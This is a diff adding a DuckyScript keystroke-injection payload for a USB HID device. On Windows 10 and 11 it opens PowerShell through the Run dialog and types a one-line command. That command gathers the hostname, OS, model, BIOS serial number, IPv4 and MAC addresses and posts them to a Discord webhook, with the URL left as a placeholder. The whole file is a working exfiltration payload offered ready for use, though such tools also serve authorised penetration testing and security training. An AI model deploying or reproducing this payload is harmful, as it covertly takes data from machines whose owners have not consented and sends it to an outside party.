@@ -1,0 +1,17 @@
+REM      Author : 4esv
+REM Description : Obtains Hostname, OS, Serial #, IPv4 and MAC Addresses then sends it to Discord Webhook
+REM      System : Windows 10, 11
+DELAY 500
+REM -Open Powershell
+GUI r
+DELAY 500
+STRING powershell
+DELAY 250
+ENTER
+DELAY 500
+GUI UP
+DELAY 250
+REM -Obtain HostName, Model, Serial Number, IP, MAC and OS, then, send it to Discord Webhook.
+STRING $HNAME = (Get-CimInstance Win32_OperatingSystem | Select-Object CSName | FL | Out-String).Trim();$OS = (Get-CimInstance Win32_OperatingSystem | Select-Object  Caption | FL | Out-String).Trim();$MODEL = (Get-CimInstance -ClassName Win32_ComputerSystem | Select Model | FL | Out-String).Trim();$SERIAL = (Get-WmiObject win32_bios | select SerialNumber | FL | Out-String).Trim();$IP = (ipconfig | findstr "IPv4").Trim();$MAC = (ipconfig /all | findstr /R "..-..-..-..-..-.." | findstr "Physical").Trim();clear;$REPORT = echo $OS $MODEL $SERIAL $IP $MAC ;$POST = @{'username' = $HNAME.split(":")[1].Trim(); 'content' = $REPORT | Out-String}; Invoke-RestMethod -Uri [YOUR DISCORD WEBHOOK LINK GOES HERE] -Method 'post' -Body $POST
+DELAY 250
+ENTER
